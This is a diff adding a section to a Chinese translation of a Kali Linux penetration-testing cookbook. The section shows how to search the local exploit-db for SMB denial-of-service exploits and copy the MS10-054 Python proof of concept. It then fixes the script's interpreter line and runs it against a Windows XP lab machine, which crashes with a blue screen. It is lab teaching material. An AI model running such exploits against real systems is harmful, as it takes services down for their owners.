@@ -1660,3 +1660,122 @@ msf  auxiliary(ms06_063_trans) > run
 ### 工作原理
 
 本练习中演示的 Metasploit DoS 辅助模块是缓冲区溢出攻击的示例。 一般来说，缓冲区溢出能够导致拒绝服务，因为它们可能导致任意数据被加载到非预期的内存段。 这可能中断执行流程，并导致服务或操作系统崩溃。
+
+## 6.11 使用 exploit-db 执行DoS 攻击
+
+exploit-db 是针对所有类型的平台和服务的，公开发布的漏洞利用集合。 exploit-db 拥有许多可用于执行DoS攻击的漏洞。 这个特定的秘籍演示了如何在 exploit-db 中找到DoS漏洞，确定漏洞的用法，进行必要的修改并执行它们。
+
+### 准备
+
+为了使用 exploit-db 执行 DoS 攻击，你需要有一个运行漏洞服务的系统，它易受 Metasploit DoS 辅助模块之一的攻击。 所提供的示例使用 Windows XP 的实例。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。
+
+### 操作步骤
+
+在使用 exploit-db 执行 DoS 测试之前，我们需要确定哪些 DoS 漏洞可用。 可以在`http://www.exploit-db.com`在线找到全部的漏洞利用数据库。 或者，其副本也本地存储在 Kali Linux 文件系统中。 在`exploitdb`目录中有一个`files.csv`文件，其中包含所有内容的目录。 此文件可用于对关键字进行`grep`，来帮助定位可用的漏洞利用：
+
+```
+root@KaliLinux:~# grep SMB /usr/share/exploitdb/files.csv 
+20,platforms/windows/remote/20.txt,"MS Windows SMB Authentication Remote Exploit",2003-04-25,"Haamed Gheibi",windows,remote,139 
+1065,platforms/windows/dos/1065.c,"MS Windows (SMB) Transaction Response Handling Exploit (MS05-011)",2005-06-23,cybertronic,windows,dos,0 
+4478,platforms/linux/remote/4478.c,"smbftpd 0.96 SMBDirListfunction Remote Format String Exploit",2007-10-01,"Jerry Illikainen",linux,remote,21 
+6463,platforms/windows/dos/6463.rb,"MS Windows WRITE_ANDX SMB command handling Kernel DoS (meta)",2008-09-15,"Javier Vicente Vallejo",windows,dos,0
+9594,platforms/windows/dos/9594.txt,"Windows Vista/7 SMB2.0 Negotiate Protocol Request Remote BSOD Vuln",2009-09-09,"Laurent Gaffie",windows,dos,0
+```
+
+在所提供的示例中，我们使用`grep`函数在`files.csv`文件中搜索包含 SMB 的任何 exploit-db 内容。 还可以通过将输出通过管道连接到另一个`grep`函数，并搜索附加项来进一步缩小搜索范围：
+
+```
+root@KaliLinux:~# grep SMB /usr/share/exploitdb/files.csv | grep dos 
+1065,platforms/windows/dos/1065.c,"MS Windows (SMB) Transaction Response Handling Exploit (MS05-011)",2005-06-23,cybertronic,windows,dos,0 
+6463,platforms/windows/dos/6463.rb,"MS Windows WRITE_ANDX SMB command handling Kernel DoS (meta)",2008-09-15,"Javier Vicente Vallejo",windows,dos,0 
+9594,platforms/windows/dos/9594.txt,"Windows Vista/7 SMB2.0 Negotiate Protocol Request Remote BSOD Vuln",2009-09-09,"Laurent Gaffie",windows,dos,0 
+12258,platforms/windows/dos/12258.py,"Proof of Concept for MS10-006 SMB Client-Side Bug",2010-04-16,"Laurent Gaffie",windows,dos,0 
+12273,platforms/windows/dos/12273.py,"Windows 7/2008R2 SMB Client Trans2 Stack Overflow 10-020 PoC",2010-04-17,"Laurent Gaffie",windows,dos,0 
+```
+
+在提供的示例中，我们依次使用两个独立的`grep`函数，来搜索与 SMB 服务相关的任何 DoS 漏洞：
+
+```
+root@KaliLinux:~# grep SMB /usr/share/exploitdb/files.csv | grep dos | grep py | grep -v "Windows 7" 
+12258,platforms/windows/dos/12258.py,"Proof of Concept for MS10-006 SMB Client-Side Bug",2010-04-16,"Laurent Gaffie",windows,dos,0 
+12524,platforms/windows/dos/12524.py,"Windows SMB2 Negotiate Protocol (0x72) Response DOS",2010-05-07,"Jelmer de Hen",windows,dos,0 
+14607,platforms/windows/dos/14607.py,"Microsoft SMB Server Trans2 Zero Size Pool Alloc (MS10-054)",2010-08-10,"Laurent Gaffie",windows,dos,0 
+```
+
+我们可以继续缩小搜索结果，使其尽可能具体。 在提供的示例中，我们查找了 SMB 服务的任何 Python DoS 脚本，但是我们寻找的不是 Windows 7 平台的。 `gre`p中的`-v`选项可用于从结果中排除内容。 通常最好将所需的漏洞利用复制到另一个位置，以便不会修改 exploit 数据库目录的内容：
+
+```
+root@KaliLinux:~# mkdir smb_exploit 
+root@KaliLinux:~# cd smb_exploit/ 
+root@KaliLinux:~/smb_exploit# cp /usr/share/exploitdb/platforms/windows/ dos/14607.py /root/smb_exploit/ 
+root@KaliLinux:~/smb_exploit# ls 14607.py
+
+```
+
+在提供的示例中，我们为脚本创建一个新目录。 然后从绝对路径复制脚本，该路径可以由 exploit-db 的目录位置和`files.csv`文件中定义的相对路径推断。 一旦重新定位，就可以使用`cat`命令从上到下读取脚本，然后将脚本的内容传递给`more`工具：
+
+```
+root@KaliLinux:~/smb_exploit# cat 14607.py | more ?
+
+#!/usr/bin/env python 
+import sys,struct,socket 
+from socket import *
+
+if len(sys.argv)<=2:   
+    print '############################################################### ########'   
+    print '#   MS10-054 Proof Of Concept by Laurent Gaffie'   
+    print '#   Usage: python '+sys.argv[0]+' TARGET SHARE-NAME (No backslash)'   
+    print '#   Example: python '+sys.argv[0]+' 192.168.8.101 users'   
+    print '#   http://g-laurent.blogspot.com/'   
+    print '#   http://twitter.com/laurentgaffie'   
+    print '#   Email: laurent.gaffie{at}gmail{dot}com'   
+    print '############################################################### ########\n\n'   
+    sys.exit() 
+```
+
+与 NSE 脚本和 Metasploit 辅助模块不同，漏洞数据库中的脚本没有标准化格式。 因此，使用漏洞有时会很棘手。 尽管如此，查看脚本内容中的为注释或使用说明通常是有帮助的。 在提供的示例中，我们可以看到，使用情况列在脚本的内容中，如果未提供适当数量的参数，也会将其打印给用户。 评估之后，可以执行脚本。
+
+```
+root@KaliLinux:~/smb_exploit# ./14607.py 
+./14607.py: line 1: ?#!/usr/bin/env: No such file or directory 
+import.im6: unable to open X server `' @ error/import.c/ 
+ImportImageCommand/368. 
+from: can't read /var/mail/socket 
+./14607.py: line 4: $'\r': command not found 
+./14607.py: line 5: syntax error near unexpected token `sys.argv' 
+'/14607.py: line 5: `if len(sys.argv)<=2:
+
+```
+
+但是，在尝试执行脚本后，我们可以看到出现了问题。 由于缺乏标准化，并且由于一些脚本只是概念证明，通常需要对这些脚本进行调整：
+
+```py
+?#!/usr/bin/env python 
+import sys,struct,socket 
+from socket import * 
+```
+
+在脚本错误出现后，我们需要返回到文本编辑器，并尝试确定错误的来源。 第一个错误表明，在脚本开头列出的 Python 解释器的位置存在问题。 这必须改变为指向 Kali Linux 文件系统中的解释器：
+
+```py
+#!/usr/bin/python 
+import sys,struct,socket 
+from socket import * 
+```
+
+在每个问题解决后，尝试再次运行脚本通常是个好主意，有时，修复单个问题会消除多个执行错误。 这里，在更改 Python 解释器的位置后，我们可以成功运行脚本：
+
+```
+root@KaliLinux:~/smb_exploit# ./14607.py 172.16.36.134 users 
+[+]Negotiate Protocol Request sent 
+[+]Malformed Trans2 packet sent 
+[+]The target should be down now 
+```
+
+当脚本运行时，会返回几个消息来标识脚本执行的进度。 最后一条消息表明恶意的载荷已传送，服务器应该已经崩溃。 该脚本的成功执行可以通过返回 Windows 服务器来验证，它现在已经崩溃，并显示了 BSOD：
+
+![](img/6-11-1.jpg)
+
+### 工作原理
+
+本练习中演示的 exploit-db DoS 脚本是缓冲区溢出攻击的示例。 一般来说，缓冲区溢出能够导致拒绝服务，因为它们可能导致任意数据被加载到非预期的内存段。 这可能中断执行流程，并导致服务或操作系统崩溃。
